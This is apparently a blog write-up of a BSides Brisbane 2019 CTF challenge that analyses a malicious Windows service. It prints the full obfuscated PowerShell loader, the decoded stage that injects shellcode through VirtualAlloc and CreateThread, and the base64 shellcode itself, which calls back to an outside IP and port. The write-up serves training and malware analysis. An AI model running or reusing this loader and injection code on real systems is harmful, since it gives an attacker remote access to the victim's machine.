---
layout: post
title: "BSides Brisbane 2019 CTF - misc - cyberchef(250pts)"
description: "BSides Brisbane 2019 CTF - misc - cyberchef"
category: ctf, bsides_brisbane_2019, misc, cyberchef, powershell, shellcode, write-up
tags: [ctf, bsides_brisbane_2019, misc, cyberchef, powershell, shellcode, write-up]
---


### Original description: ###
```text
cyberchef (250pts)

Our threat hunting team has found a service installed on a statistically significant number of machines. Please analyse this service, determine what it does, and report findings. flag is of the format - ipaddress:port

Files:
service.txt
```
#### service.txt ####
```powershell
Service Name: EIAsdsaWINGKVfds
Service File Name: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq
4){$b=&amp;apos;powershell.exe&amp;apos;}else{$b=$env:windir+&amp;apos;\syswow64
\WindowsPowerShell\v1.0\powershell.exe&amp;apos;};$s=New-Object
System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=&amp;apos;-nop -w hidden -c
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&amp;apos;
&amp;apos;H4sIANJ721wA/71WaW/azBb+DL/CqpCwVYKB0GaRKt2xzRaWAA5mK7qa2GMzYewh9jgsvf3
vPQacELW9t28/XCTEzJx1nvOcObhxYAvKA8nR+awS4k1N+pbN9HGIfUnOhcNRPIgKUs4V/nh/Ux5Opkomk
83k7MZ+b0hfJHmO1muD+
5gGi9tbPQ5DEojjvtggAkUR8R8ZJZGsSP+RxksSkov7xydiC+mblPt3scH4I2YntZ2O7SWRLlDgJLIOt3GSWtFcM
yrk/NeveWV+UV4Ua88xZpGcN3eRIH7RYSyvSN+VJODDbk3kfJfaIY+
4K4pjGlxWiqMgwi7pgbcX0iViyZ0or2ThHiERcRhIx+sk9kepnIdlP+Q2cpyQRKBcbAUvfEXkXBAzVpD+Jc9PwY
dxIKhPQC5IyNcmCV+oTaJiEwcOI0PiLuQe2aR3/lMj+dwItPoiVApQj1/l2eVOzMjRNK/8nOmpiAp83hdSyX7P
Zl/rT8rTs8pnM5n5YUkgQ7nPI3pQ+iKVClIXQmHBwx1scw9hTJSFNE+Any8WUi7ueQ238Fv7cqoMqhGuaW
gm6tebXgyiucWps8hmDpXJRdYgOfs9vQzi0oAYuwD71E4Z9A64FG3iMtgmTErVepCYnD8JiGMQRjwsEvgK0
mtl38xqPhWvtlpMmUNCZEPFIsgKiqm8T+ZYETnfCrrEB5yO+
3yCPvCWpNonru7S6MkelPI6wxH0XD+GxrELkkkwI05BQkFETyIUC35Ygnqabjdmgto4Eqm7BeCYoHiKpvMg
EmFsQ+Hg5g/mmtgUswSIgtSkDtF2JvXSqGd+z2DQMWM08MDTC5QBTpLrmyKhQwgJHkuvFE0iWv6aER+
UDg1cZ9iDdj2x/kAg7BEnacGzBFNKH/mbAJEicJYeVNdkXBQki4YCXoEE1HMa/V0Wbw9Bko4eklM15EOLzL
WdSLid27fa3mpiJDRO0TlgEQrAoR5yX8MR+Vw1RQgoyR/Ue6oj+ExbAeva2oqW0YaWW134juhlixtXTvvuq
amGxnbpolbU6jb7xqDZrL7cmVZVmLWWaPdbolubPD2ZqDkcTcWshZoPtLSaVvfrO7o3O8iZbtXPe22/KWn
b/ZPnuFPDdb0r1xyWP9VpZ6wPtFIFd4xa3BlrG61UjWp00xzQ0WB1VxePU4vhkat6k/INpttO+GSVeXffQqix
vLT3d67VWHad3bSp3oyrK1RDSA9qVl3j7akWor5qYc/il/fX9bbv6UhDA0pmg1FdGwzqGho1np6NG9UD2wl
eamOrQmfryXAJ+zqk0FZL1ZZD9nw6AJAaHGFvCDqeXrGXLugYH5H2scejCl5pHHwjVJ89Q17Tdb3PQP4wqn
Bksd4Eo85sV1fV8rRfRc0SHTc8lLjEnjbAKHox9oZathzujD/1pq5qTdiVaugPa9tVVXXTNNr2rLy9vr+qaqVn3ac
+e6w46s3oWgs2ba//4jmD8dVw29s9QryRqlofgDGZbG6nd2yLjINeFJ0R4ndPexeH0RIzIAo82WmL1nlYP72/
fU4TC1l+m8MrEgaEwfiCAZfyHTHG7WQUJM81TKHjbFhAu45geVn55UqBMX1ShCGQDoj06PZ2BplC46T0L
nZI4IllobS9LJXgvS9tqyUl++cX1Pl6J796A3vwfQbWeSR2iKRks7noOtYq7v8ByFN3L+HH+R9Avp39F+kfgVsqv
EPgJ+n7g38C9t+BMMZUgLoJ7xQjx2n5SyxO/Dn7V3GsE3DDPX2S/3X3sbjoxYz9AG+qvoBNCgAA&amp;apo
s;&amp;apos;));IEX (New-Object IO.StreamReader(New-Object
IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
&amp;apos;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;
$s.WindowStyle=&amp;apos;Hidden&amp;apos;;$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);
Service Type: user mode service
Service Start Type: demand start
Service Account: LocalSystem

```

The attached services.txt file appears to be a windows service which was setup for persistence using a powershell oneliner. The powershell oneliner will determine the CPU architechure and invoke the appropiate version of powershell. It will assign to the variable s a base64 string which will be gzip decompressed and evaluated.

#### Stage 1 ####
```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIANJ721wA/71WaW/azBb+DL/CqpCwVYKB0GaRKt2xzRaWAA5mK7qa2GMzYewh9jgsvf3vPQacELW9t28/XCTEzJx1nvOcObhxYAvKA8nR+awS4k1N+pbN9HGIfUnOhcNRPIgKUs4V/nh/Ux5Opkomk83k7MZ+b0hfJHmO1muD+5gGi9tbPQ5DEojjvtggAkUR8R8ZJZGsSP+RxksSkov7xydiC+mblPt3scH4I2YntZ2O7SWRLlDgJLIOt3GSWtFcMyrk/NeveWV+UV4Ua88xZpGcN3eRIH7RYSyvSN+VJODDbk3kfJfaIY+4K4pjGlxWiqMgwi7pgbcX0iViyZ0or2ThHiERcRhIx+sk9kepnIdlP+Q2cpyQRKBcbAUvfEXkXBAzVpD+Jc9PwYdxIKhPQC5IyNcmCV+oTaJiEwcOI0PiLuQe2aR3/lMj+dwItPoiVApQj1/l2eVOzMjRNK/8nOmpiAp83hdSyX7PZl/rT8rTs8pnM5n5YUkgQ7nPI3pQ+iKVClIXQmHBwx1scw9hTJSFNE+Any8WUi7ueQ238Fv7cqoMqhGuaWgm6tebXgyiucWps8hmDpXJRdYgOfs9vQzi0oAYuwD71E4Z9A64FG3iMtgmTErVepCYnD8JiGMQRjwsEvgK0mtl38xqPhWvtlpMmUNCZEPFIsgKiqm8T+ZYETnfCrrEB5yO+3yCPvCWpNonru7S6MkelPI6wxH0XD+GxrELkkkwI05BQkFETyIUC35Ygnqabjdmgto4Eqm7BeCYoHiKpvMgEmFsQ+Hg5g/mmtgUswSIgtSkDtF2JvXSqGd+z2DQMWM08MDTC5QBTpLrmyKhQwgJHkuvFE0iWv6aER+UDg1cZ9iDdj2x/kAg7BEnacGzBFNKH/mbAJEicJYeVNdkXBQki4YCXoEE1HMa/V0Wbw9Bko4eklM15EOLzLWdSLid27fa3mpiJDRO0TlgEQrAoR5yX8MR+Vw1RQgoyR/Ue6oj+ExbAeva2oqW0YaWW134juhlixtXTvvuqamGxnbpolbU6jb7xqDZrL7cmVZVmLWWaPdbolubPD2ZqDkcTcWshZoPtLSaVvfrO7o3O8iZbtXPe22/KWnb/ZPnuFPDdb0r1xyWP9VpZ6wPtFIFd4xa3BlrG61UjWp00xzQ0WB1VxePU4vhkat6k/INpttO+GSVeXffQqixvLT3d67VWHad3bSp3oyrK1RDSA9qVl3j7akWor5qYc/il/fX9bbv6UhDA0pmg1FdGwzqGho1np6NG9UD2wleamOrQmfryXAJ+zqk0FZL1ZZD9nw6AJAaHGFvCDqeXrGXLugYH5H2scejCl5pHHwjVJ89Q17Tdb3PQP4wqnBksd4Eo85sV1fV8rRfRc0SHTc8lLjEnjbAKHox9oZathzujD/1pq5qTdiVaugPa9tVVXXTNNr2rLy9vr+qaqVn3ac+e6w46s3oWgs2ba//4jmD8dVw29s9QryRqlofgDGZbG6nd2yLjINeFJ0R4ndPexeH0RIzIAo82WmL1nlYP72/fU4TC1l+m8MrEgaEwfiCAZfyHTHG7WQUJM81TKHjbFhAu45geVn55UqBMX1ShCGQDoj06PZ2BplC46T0LnZI4IllobS9LJXgvS9tqyUl++cX1Pl6J796A3vwfQbWeSR2iKRks7noOtYq7v8ByFN3L+HH+R9Avp39F+kfgVsqvEPgJ+n7g38C9t+BMMZUgLoJ7xQjx2n5SyxO/Dn7V3GsE3DDPX2S/3X3sbjoxYz9AG+qvoBNCgAA'));
$stage2=(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

#### Stage 2 ####

Stage 2 is looks like pretty standard shellcode injection. The shellcode is decompressed and assigned to the byte array zIKgkXDn.
```powershell
PS C:\Users\Flare> $stage2
function dCoZ2rawE {
	Param ($rRUuQs, $ftmWz91RXY)		
	$cGzzD = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals(
'System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $cGzzD.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.Intero
pServices.HandleRef((New-Object IntPtr), ($cGzzD.GetMethod('GetModuleHandle')).Invoke($null, @($rRUuQs)))), $ftmWz91RXY))
}

function e1Y {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $uNgGf,
		[Parameter(Position = 1)] [Type] $saEBAZtF8wNu = [Void]
	)
	
	$sVQ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Ref
lection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, S
ealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$sVQ.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $uNgGf).SetImplementatio
nFlags('Runtime, Managed')
	$sVQ.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $saEBAZtF8wNu, $uNgGf).SetImplementationFlags('Runtime, Managed')
	
	return $sVQ.CreateType()
}

[Byte[]]$zIKgkXDn = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSA
HRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEA
ACnEVFBoKYBrAP/VagVo3O8FKmgCABAQieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpF
Pl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
		
$yCLcVeWnNss = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dCoZ2rawE kernel32.dll VirtualAlloc), (e1Y @([
IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $zIKgkXDn.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($zIKgkXDn, 0, $yCLcVeWnNss, $zIKgkXDn.length)

$s8uB2f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dCoZ2rawE kernel32.dll CreateThread), (e1Y @([IntPt
r], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$yCLcVeWnNss,[IntPtr]::Zero,0,[IntPtr]::Zer
o)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dCoZ2rawE kernel32.dll WaitForSingleObject), (e1Y @([IntPtr],
 [Int32]))).Invoke($s8uB2f,0xffffffff) | Out-Null
```

#### Shellcode analysis ####
Next we get the base64 encode shellcode, decode it and save it out using the following command
```shell
echo -n "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSA
HRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEA
ACnEVFBoKYBrAP/VagVo3O8FKmgCABAQieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpF
Pl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V" | base64 -d > shellcode.bin
```

With the shellcode written out to a file, we can analyse it using scdbg.
I used the following options scdbg's gui.

<img src="{{site.url}}/assets/2019-07-10-bsides-brisbane-misc-cyberchef-shellcode-load.png">

Here is the output of scdbg when the shellcode is being executed

<img src="{{site.url}}/assets/2019-07-10-bsides-brisbane-misc-cyberchef-shellcode-run.png">

The final flag is 220.239.5.42:4112

#### References ####
https://medium.com/@tstillz17/analyzing-obfuscated-powershell-with-shellcode-1b6cb8ab5ab0
